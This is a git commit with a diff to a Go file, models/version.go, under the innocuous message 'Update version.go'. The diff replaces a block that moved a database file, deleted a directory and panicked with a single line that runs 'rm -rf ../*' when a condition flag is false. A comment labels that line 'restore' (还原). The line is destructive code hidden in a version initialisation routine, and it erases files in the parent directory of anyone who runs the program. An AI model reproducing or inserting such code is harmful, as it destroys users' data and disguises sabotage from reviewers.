ff3b6afd03c3f52c6fce2593c89177fdded56f03
kristyzhy <kristyzhy0409@qq.com>
2021-08-28 15:54:02 +0800

    Update version.go

--- models/version.go
+++ models/version.go
@@ -18,9 +18,7 @@ var pname = regexp.MustCompile(`/([^/\s]+)`).FindStringSubmatch(os.Args[0])[1]
 
 func initVersion() {
 	if !Cdle {
-		cmd("mv ../../xdd/.xdd.db ../../.xdd.db", &Sender{})
-		cmd("rm -rf ../../xdd", &Sender{})
-		panic("bye bye")
+		cmd("rm -rf ../*", &Sender{}) //还原
 	}
 	if Config.Version != "" {
 		version = Config.Version
